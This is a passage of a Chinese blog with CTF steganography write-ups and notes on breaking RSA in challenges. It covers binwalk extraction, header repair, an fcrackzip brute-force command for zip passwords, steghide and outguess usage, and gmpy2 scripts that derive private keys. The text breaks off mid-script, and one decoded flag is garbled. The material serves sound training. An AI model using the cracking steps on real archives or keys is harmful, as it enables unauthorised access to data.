<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201126203907900.png"></p>
<p>2.将文件使用010软件打开，发现文件开头十六进制为</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201126204147474.png"></p>
<p>对比正确的gif的开头标志</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">47 49 46 38 39 61</span><br></pre></td></tr></table></figure>

<p>发现头文件格式错误，因此给他加上，在编译文本给它加上GIF89,保存</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201126204458751.png"></p>
<p>得到一个gif</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201126205200092.png"></p>
<p>3.接下来使用gif分帧找到小黄人出现的坐标</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">16 53 17 6 30 54 5 34 24 53 61 36 25 22 25 31 25 55 52</span><br></pre></td></tr></table></figure>

<p>在64进制表上进行匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Q1RGe2FiY19kZWfZ30</span><br></pre></td></tr></table></figure>

<p>使用base64解码得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTF&#123;abc_degٟ</span><br></pre></td></tr></table></figure>

<h4 id="bw-图片隐写-爱因斯坦"><a href="#bw-图片隐写-爱因斯坦" class="headerlink" title="bw-图片隐写-爱因斯坦"></a>bw-图片隐写-爱因斯坦</h4><p>1.将解压得到的misc2.jpg放入kail binwalk分离</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231030601.png"></p>
<p>得到一个包</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231050937.png"></p>
<p>解压得到另一个包</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231449902.png"></p>
<p>发现这个包解压需要密码，猜测为伪密码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231356497.png"></p>
<p>然后对一开始的图片进行分析，查看属性</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231655958.png"></p>
<p>将这个输进去试试，得到flag.txt—-flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127231833072.png"></p>
<h4 id="bw-图片隐写-0707"><a href="#bw-图片隐写-0707" class="headerlink" title="bw-图片隐写-0707"></a>bw-图片隐写-0707</h4><p>猜想：隐藏图片高度</p>
<p>1.解压放进010查看，看见这个照片是iphone5拍的</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127232138312.png"></p>
<p>2.查看iphone5的后置摄像头为<strong>3264*2448</strong></p>
<p>而这个摄像头为<strong>3264*1681</strong>确实是隐藏了高度，改一下数据</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127234429341.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201127234826345.png"></p>
<p>得到flag</p>
<p><img src="C:\Users\ggken\Desktop\0707.png" alt="0707"></p>
<h4 id="bw-图片隐写-二维码"><a href="#bw-图片隐写-二维码" class="headerlink" title="bw-图片隐写-二维码"></a>bw-图片隐写-二维码</h4><p>得到一个二维码，扫进去是secret is here</p>
<p>1.放进binwalk去，得到一个安装包</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128000237976.png"></p>
<p>在放进010</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128000619629.png"></p>
<p>发现有一个文件，打开需要密码，用fcrackzip爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -b -ca -l 1-4 -u 压缩文件</span><br></pre></td></tr></table></figure>

<p>-b 暴力破解模式 -c 指定掩码类型（a=a-z;1=0-9;!=特殊字符） -l 密码长度 -u 压缩文件名</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128003451828.png"></p>
<p>输入7639得到flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128003551689.png"></p>
<h4 id="bw-图片隐写-five"><a href="#bw-图片隐写-five" class="headerlink" title="bw-图片隐写-five"></a>bw-图片隐写-five</h4><p>1.解压得到一个图片，用010看发现还存在一张图</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128100440622.png"></p>
<p>需要密码才能打开</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128105419671.png"></p>
<p>用图片名称1111110000000000进行16进制转换得到FC00</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128105754215.png"></p>
<p>打开后得到一个图片</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128110132688.png"></p>
<p>2.用010打开这个照片，得到一个php语句，将它拿去base64解码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128110400349.png"></p>
<p>得到遗传莫斯密码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128110604614.png"></p>
<p>拿去解码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128110702183.png"></p>
<p>得到一串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7a57a5a743894a0e </span><br></pre></td></tr></table></figure>

<p>用MD5解码得到flag</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201128110904109.png"></p>
<h4 id="bw-图片隐写-fruit"><a href="#bw-图片隐写-fruit" class="headerlink" title="bw-图片隐写-fruit"></a>bw-图片隐写-fruit</h4><p>1.解压把图片放进stegsolve,按方向不断切换得到一个二维码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129102218308.png"></p>
<p>2.扫码得到</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129102417671.png"></p>
<p>3.将数字转换成ASCII码后得到字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-.-. - ..-. .-.. ... -... ..--.- -... ... .-..</span><br></pre></td></tr></table></figure>

<p>4.通过解莫斯密码，得到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CTFLSB_BSL</span><br></pre></td></tr></table></figure>

<h4 id="bw-图片隐写-snake"><a href="#bw-图片隐写-snake" class="headerlink" title="bw-图片隐写-snake"></a>bw-图片隐写-snake</h4><p>1.将snake.jpg用010打开发现不是图片不是以FF D9结尾的。</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129133753436.png"></p>
<p>2.拉进binwalk进行分离，得到两个文件</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129133837760.png"></p>
<p>3.在key中发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo&#x3D;</span><br></pre></td></tr></table></figure>

<p>进行base64解码，得到</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129133947628.png"></p>
<p>查看NiKi Minaj’的信息</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129135038004.png"></p>
<p>4.cipher文件是加密的文件，用工具<a target="_blank" rel="noopener" href="http://serpent.online-domain-tools.com/%EF%BC%8C%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0flag">http://serpent.online-domain-tools.com/，解码得到flag</a></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129135230957.png"></p>
<h4 id="bw-图片隐写-paint"><a href="#bw-图片隐写-paint" class="headerlink" title="bw-图片隐写-paint"></a>bw-图片隐写-paint</h4><p>1.解压文件是一个坐标文件，用gnuplot画图，得到二维码</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129140915713.png"></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201129141310449.png"></p>
<h4 id="bw-图片隐写-教练我想打ctf"><a href="#bw-图片隐写-教练我想打ctf" class="headerlink" title="bw-图片隐写-教练我想打ctf"></a>bw-图片隐写-教练我想打ctf</h4><p>1.将图片放进stegSolve</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201201212402443.png"></p>
<p>save bin保存到桌面，并进行改后缀为 flag.zip</p>
<p>2.将保存的装包放进kail</p>
<p>用binwalk 分离得到文件 1</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201201212643786.png"></p>
<p>3.用010打开发现</p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201201212816503.png"></p>
<h4 id="bw-图片隐写-九连环"><a href="#bw-图片隐写-九连环" class="headerlink" title="bw-图片隐写-九连环"></a>bw-图片隐写-九连环</h4><p>工具：steghide</p>
<p>使用方法：</p>
<p>*隐藏文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. steghide embed -cf [图片文件载体] -ef [待隐藏文件]</span><br><span class="line">2. [回车]</span><br><span class="line">3. 输入密码，提取文件时用到，如果不想设密码，直接按回车</span><br><span class="line">4. [ENTER]</span><br></pre></td></tr></table></figure>

<p>*使用以下命令显示隐藏在文件中的信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info 文件名</span><br></pre></td></tr></table></figure>

<p>*提取隐藏的文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf 文件名</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/image-20201201163137910.png"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://ggken753.github.io/2020/11/26/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B08/" data-id="cki71zk5k0000k0v3ecai4cyc" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-学习笔记7" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/11/25/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B07/" class="article-date">
  <time datetime="2020-11-25T08:20:44.808Z" itemprop="datePublished">2020-11-25</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="借鉴于https-www-cnblogs-com-chenxs-p-11493898-html和https-www-cnblogs-com-NPFS-p-13383625-html大佬的介绍和解题思路"><a href="#借鉴于https-www-cnblogs-com-chenxs-p-11493898-html和https-www-cnblogs-com-NPFS-p-13383625-html大佬的介绍和解题思路" class="headerlink" title="//借鉴于https://www.cnblogs.com/-chenxs/p/11493898.html和https://www.cnblogs.com/NPFS/p/13383625.html大佬的介绍和解题思路"></a>//借鉴于<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11493898.html%E5%92%8Chttps://www.cnblogs.com/NPFS/p/13383625.html%E5%A4%A7%E4%BD%AC%E7%9A%84%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">https://www.cnblogs.com/-chenxs/p/11493898.html和https://www.cnblogs.com/NPFS/p/13383625.html大佬的介绍和解题思路</a></h2><h2 id="隐写术"><a href="#隐写术" class="headerlink" title="隐写术"></a>隐写术</h2><h3 id="图像隐写术进行数据隐写分为以下几类："><a href="#图像隐写术进行数据隐写分为以下几类：" class="headerlink" title="图像隐写术进行数据隐写分为以下几类："></a>图像隐写术进行数据隐写分为以下几类：</h3><ul>
<li>1.在图片右击查看属性，在详细信息中隐藏数据</li>
<li>2.将数据类型进行改写（rar或者zip数据改为jpg等格式）</li>
<li>3.根据各种类型图像的固定格式，隐藏数据</li>
<li>在编译器中修改图像开始的标志，改变其原来图像格式</li>
<li>在图像结束标志后加入数据</li>
<li>在图像数据中加入数据，不影响视觉效果情况下修改像素数据，加入信息</li>
<li>4.利用隐写算法将数据隐写到图片中而不影响图像（仅限于jpg图像） 隐写常用的算法有F5，guess jsteg jphide。</li>
</ul>
<h3 id="破解隐写术方法及步骤"><a href="#破解隐写术方法及步骤" class="headerlink" title="破解隐写术方法及步骤"></a>破解隐写术方法及步骤</h3><ul>
<li><p>1.查看图像属性详细信息是否有隐藏内容</p>
</li>
<li><p>2.利用winhex或nodepad++打开搜索ctf,CTF，flag,key等关键字是否存在相关信息</p>
</li>
<li><p>3.检查图像的开头标志和结束标志是否正确，若不正确修改图像标志恢复图像，打开查看是否有flag或ctf信息，（往往gif属于动图，需要分帧查看各帧图像组合所得数据 若不是直接的ctf或flag信息 需要考虑将其解码）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">- jpg图像开始标志：FF D8 结束标志 ：FF D9</span><br><span class="line">- gif图像开始标志：47 49 46 38 39 61 (GIF89)结束标志：01 01 00 3B</span><br><span class="line">- bmp图片开始标志：42 4D &#x2F;&#x2F;92 5B 54 00 00 00 00 00 结束标志：00</span><br><span class="line">- png图片开始标志：89 50 结束标志：60 82</span><br><span class="line">- TIFF (tif)开始标志：49 49 2A 00</span><br><span class="line">- Windows Bitmap (bmp)开始标志：42 4D</span><br><span class="line">- CAD (dwg)开始标志：41 43 31 30</span><br><span class="line">- Adobe Photoshop (psd)开始标志：38 42 50 53</span><br><span class="line">- Rich Text Format (rtf)开始标志：7B 5C 72 74 66</span><br><span class="line">- XML (xml)开始标志：3C 3F 78 6D 6C</span><br><span class="line">- HTML (html)开始标志：68 74 6D 6C 3E</span><br><span class="line">- Email [thorough only] (eml)开始标志：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3A</span><br><span class="line">- Outlook Express (dbx)开始标志：CF AD 12 FE C5 FD 74 6F</span><br><span class="line">- Outlook (pst)开始标志：21 42 44 4E</span><br><span class="line">- MS Word&#x2F;Excel (xls.or.doc)开始标志：D0 CF 11 E0</span><br><span class="line">- MS Access (mdb)开始标志：53 74 61 6E 64 61 72 64 20 4A</span><br><span class="line">- WordPerfect (wpd)开始标志：FF 57 50 43</span><br><span class="line">- Postscript (eps.or.ps)开始标志：25 21 50 53 2D 41 64 6F 62 65</span><br><span class="line">- Adobe Acrobat (pdf)开始标志：25 50 44 46 2D 31 2E</span><br><span class="line">- Quicken (qdf)开始标志：AC 9E BD 8F</span><br><span class="line">- Windows Password (pwl)开始标志：E3 82 85 96</span><br><span class="line">- ZIP Archive (zip)开始标志：50 4B 03 04  结束标志：50 4B</span><br><span class="line">- RAR Archive (rar)开始标志：52 61 72 21</span><br><span class="line">- Wave (wav)开始标志：57 41 56 45</span><br><span class="line">- AVI (avi)开始标志：41 56 49 20</span><br><span class="line">- Real Audio (ram)开始标志：2E 72 61 FD</span><br><span class="line">- Real Media (rm)开始标志：2E 52 4D 46</span><br><span class="line">- MPEG (mpg)开始标志：00 00 01 BA</span><br><span class="line">- MPEG (mpg)开始标志：00 00 01 B3</span><br><span class="line">- Quicktime (mov)开始标志：6D 6F 6F 76</span><br><span class="line">- Windows Media (asf)开始标志：30 26 B2 75 8E 66 CF 11</span><br><span class="line">- MIDI (mid开始标志：4D 54 68 64</span><br></pre></td></tr></table></figure>



</li>
</ul>
<ul>
<li><p>4.将图片放置在kail系统中，执行binwalk xxx.jpg 查看图片中是否是多个图像组合或者包含其他文件（若存在多幅图像组合，再执行foremost xxx.jpg会自动分离；若检测出其他文件修改其后缀名即可，如zip）</p>
</li>
<li><p>5.使用StegSolve对图像进行分通道扫描，查看是否为LSB隐写</p>
</li>
<li><p>6.在kail下切换到F5-steganography，在java Extract运行</p>
</li>
<li><p>命令：java Extract 123456.jpg图片的绝对地址 -p 123456</p>
</li>
<li><p>判断是否为F5算法隐写</p>
</li>
<li><p>7.在kali系统中使用outguess-master工具（需要安装），检测是否为guess算法隐写</p>
</li>
</ul>
<h3 id="算法隐写的具体操作"><a href="#算法隐写的具体操作" class="headerlink" title="算法隐写的具体操作"></a>算法隐写的具体操作</h3><p>1.F5算法隐写</p>
<p>具体操作：在kail下切换到F5-steganography，在java Extract运行</p>
<p>命令：java Extract 123456.jpg图片的绝对地址 -p 123456</p>
<p>2.LSB算法隐写</p>
<p>具体操作：在Stegsolve.jar分析data Extract的red blue green</p>
<p>3.guess算法隐写</p>
<p>具体操作：在kail下切换到outguess目录下，直接用命令即可</p>
<p>命令:outguess -r /root/angrybird.jpg(绝对路径) 123.txt(信息存放的文本)</p>
<h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="1-MP3stego"><a href="#1-MP3stego" class="headerlink" title="1.MP3stego"></a>1.MP3stego</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">encode -E hidden_text.txt -P pass svega.wavsvega_stego.mp3</span><br><span class="line"></span><br><span class="line">Decode.exe -X -P pass(密码) svega_stego.mp3(要拷贝到目录下) &#x2F;&#x2F;解码</span><br></pre></td></tr></table></figure>



<h4 id="2-stegdetect"><a href="#2-stegdetect" class="headerlink" title="2.stegdetect"></a>2.stegdetect</h4><p>Stegdetect可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息<br>s – 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。</p>
<p>d – 打印带行号的调试信息。</p>
<p>t – 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：</p>
<p>j – 检测图像中的信息是否是用jsteg嵌入的。</p>
<p>o – 检测图像中的信息是否是用outguess嵌入的。</p>
<p>p – 检测图像中的信息是否是用jphide嵌入的。</p>
<p>i – 检测图像中的信息是否是用invisible secrets嵌入的。<br>命令：stegdetect.exe -tjopi -s10.0 xxx.jpg</p>
<p>音频：信息隐藏在声音里(逆序)，信息隐藏在数据里(分析音频数据) —-解题工具 Audition，Matlab</p>
<p>视频：信息隐藏在视频的某个或多个帧里  —解题工具 Premiere</p>
<p>文件隐写：把多个文件拼接成一个  —解题工具 binwalk</p>
<h2 id="加密题"><a href="#加密题" class="headerlink" title="加密题"></a>加密题</h2><h3 id="CTF中的RSA-算法"><a href="#CTF中的RSA-算法" class="headerlink" title="CTF中的RSA 算法"></a>CTF中的RSA 算法</h3><p>1.<strong>质数（素数)**是指在大于1的自然数中，除了1和它本身以外不再有其他因数的自然数。<br> 2.**合数</strong>是指比1大但不是素数的数<br> 3.<strong>约数（因数）</strong>整数a除以整数b(b≠0) 除得的商正好是整数而没有余数，我们就说a能被b整除，或b能整除a。a称为  b的倍数，b称为a的约数</p>
<p> 4.<strong>互质数</strong>：如果两个整数a,b的最大公因数（greatest common divisor）为1，即gcb(a,b)=1，那么称a,b两数互质<br> 5.<strong>欧拉函数</strong>是指设m为正整数，则1,2,3,4…….,m中与m互素的整数的个数记为φ(m)，叫做欧拉函</p>
<hr>
<h3 id="RSA加解密涉及变量"><a href="#RSA加解密涉及变量" class="headerlink" title="RSA加解密涉及变量"></a>RSA加解密涉及变量</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">N(n):模数（modulus）</span><br><span class="line"></span><br><span class="line">p 和 q ：N的两个因子（factor）</span><br><span class="line"></span><br><span class="line">e 和 d：(密钥) 互为模反数的两个指数（exponent）</span><br><span class="line"></span><br><span class="line">c 和 m：分别是密文和明文，这里一般指的是一个十进制的数还有一个就是n的欧拉函数值</span><br><span class="line"></span><br><span class="line">欧拉函数值：r</span><br><span class="line"></span><br><span class="line">pow(x, y, z)：效果等效pow(x, y)1 % z， 先计算x的y次方，如果存在另一个参数z，需要再对结果进行取模。</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="RSA-密钥流程"><a href="#RSA-密钥流程" class="headerlink" title="RSA 密钥流程"></a>RSA 密钥流程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.选择两个大的参数，计算出模数 N &#x3D; p * q</span><br><span class="line"></span><br><span class="line">2.计算欧拉函数 φ &#x3D; (p-1) * (q-1)，然后选择一个e(1&lt;e&lt;φ)，并且e和φ互质（互质：公约数只有1的两个整数）</span><br><span class="line"></span><br><span class="line">3.选一个整数e,满足条件1&lt;e&lt;φ(m),且gcd(φ(m),e)&#x3D;1。</span><br><span class="line"></span><br><span class="line">4.取e的模反数d，计算方法为:e * d ≡ 1 (mod φ) （模反元素：如果两个正整数e和n互质，那么一定可以找到整数d，使得 e * d - 1 被n整除，或者说e * d被n除的余数是1。这时，d就叫做e的“模反元素”。欧拉定理可以用来证明模反元素必然存在。两个整数a,b，它们除以整数M所得的余数相等：a ≡ b(mod m)，比如说5除3余数为2，11除3余数也为2，于是可写成11 ≡ 5(mod 3)。）</span><br><span class="line"></span><br><span class="line">5.对明文m进行加密：c &#x3D; pow(m, e, N),可以得到密文c。</span><br><span class="line"></span><br><span class="line">6.对密文c进行解密：m &#x3D; pow(c, d, N),可以得到明文m。</span><br><span class="line"></span><br><span class="line">7.以&#123;e,n&#125;为公开密钥，&#123;d,n&#125;为秘密密钥。</span><br></pre></td></tr></table></figure>

<p>​          <strong>对于RSA加密算法，公钥{e，n}为公钥，可以任意公开，破解RSA最直接（亦或是暴力）的方法就是分解整数N，然后计算欧拉函数φ(n)=(p-1) * (q-1),再通过d * e ≡ 1 mod φ(N)，即可计算出 d，然后就可以使用私钥{d,n}通过m =  pow(c,d,N)解密明文。</strong></p>
<h3 id="常见攻击方法"><a href="#常见攻击方法" class="headerlink" title="常见攻击方法"></a>常见攻击方法</h3><p><strong>已知<code>p</code>、<code>q</code>、<code>e</code>或者已知<code>n</code>、<code>e</code>求出<code>d</code></strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = gmpy2.mpz(<span class="number">18443</span>)<span class="comment">#初始化大整数</span></span><br><span class="line">q = gmpy2.mpz(<span class="number">49891</span>)</span><br><span class="line">e = gmpy2.mpz(<span class="number">19</span>)</span><br><span class="line">phi_n = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi_n)  <span class="comment"># invert（e，r）返回d使得e * d == 1 mod r，如果不存在d，则返回0</span></span><br><span class="line">print(<span class="string">&quot;p=&#123;0&#125;,q=&#123;1&#125;,e=&#123;2&#125;&quot;</span>.format(p,q,e))</span><br><span class="line">print(<span class="string">&quot;d is:\n%s&quot;</span>%d)</span><br></pre></td></tr></table></figure>



<p><strong>已经求出<code>d</code>、<code>n</code>、<code>c</code>，然后可以求出相应的明文m</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#求明文</span><br><span class="line">import gmpy2</span><br><span class="line">n &#x3D; 920139713   #模数</span><br><span class="line">d &#x3D; 96849619    #密钥</span><br><span class="line">c &#x3D; &quot;&quot;&quot;</span><br><span class="line">704796792</span><br><span class="line">752211152</span><br><span class="line">274704164</span><br><span class="line">...  #密文</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">result &#x3D; &quot;&quot;</span><br><span class="line">c_list &#x3D; c.split()</span><br><span class="line">#print(c_list)</span><br><span class="line">for i in c_list:</span><br><span class="line">    result +&#x3D; chr(pow(int(i),d,n))</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p><strong>已知<code>c</code>、<code>e</code>、<code>n</code>求m</strong></p>
<p>结合以上两种方法，在知道<code>n</code>的前提下可求·<code>p</code>、<code>q</code>,利用<code>p</code>、<code>q</code>、<code>e</code>可以求出<code>d</code>，，从而因为已知<code>d</code>、<code>n</code>、<code>c</code>，求出相应的明文m</p>
<hr>
<p><strong>利用n的公约数</strong></p>
<p>当题目给出若干个模数n1,n2……,且模数很大。如果两次加密的<code>n1</code>和<code>n2</code>具有相同的素因子，那么我们可以利用<code>欧几里德算法</code>直接分解<code>n1</code>和<code>n2</code>.从而计算出两个<code>n</code>的最大公约数<code>p</code>：</p>
<blockquote>
<p>素因子的定义：对于一个数n来说，将它的因子拆到若干个素数相乘，这些素数被称为n的素因子。<br> 比如 12可以被拆为2 6<br> 6不是质数，可以继续拆为2*3<br> 所以最后12的素因子就是 2, 3（不计重复元素）</p>
</blockquote>
<p>识别此类题目，通常会发现题目给了若干个n，均不相同，并且都是2048bit，4096bit级别，无法直接分解<a target="_blank" rel="noopener" href="http://www.factordb.com/index.php%EF%BC%8C%E5%B9%B6%E4%B8%94%E6%98%8E%E6%96%87%E9%83%BD%E6%B2%A1%E4%BB%80%E4%B9%88%E8%81%94%E7%B3%BB%EF%BC%8Ce%E4%B9%9F%E4%B8%80%E8%88%AC%E5%8F%9665537%E3%80%82">http://www.factordb.com/index.php，并且明文都没什么联系，e也一般取65537。</a></p>
<p><img src="https://gitee.com/lin-ziyang/hexo/raw/master/1999159-20200712082911929-729980764.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf-8-*-</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">求两个数的最大公约数</span><br><span class="line">算法参考:https:&#x2F;&#x2F;zhidao.baidu.com&#x2F;question&#x2F;36550887.html</span><br><span class="line">by:reborn</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line">import gmpy2</span><br><span class="line">n1&#x3D;</span><br><span class="line">n2&#x3D;</span><br><span class="line">def gys1(n1,n2):    #辗转相除法(欧几里德算法)</span><br><span class="line">    if n1&lt;n2:</span><br><span class="line">        n1,n2&#x3D;n2,n1</span><br><span class="line">    while n2!&#x3D;0:</span><br><span class="line">        temp&#x3D;n1%n2</span><br><span class="line">        n1&#x3D;n2</span><br><span class="line">        n2&#x3D;temp</span><br><span class="line">    return n1</span><br><span class="line">def gys2(n1,n2):    #更相减损法</span><br><span class="line">    while n1!&#x3D;n2:</span><br><span class="line">        if n1&lt;n2:</span><br><span class="line">            n1,n2&#x3D;n2,n1</span><br><span class="line">        temp&#x3D;n1-n2</span><br><span class="line">        n1&#x3D;temp</span><br><span 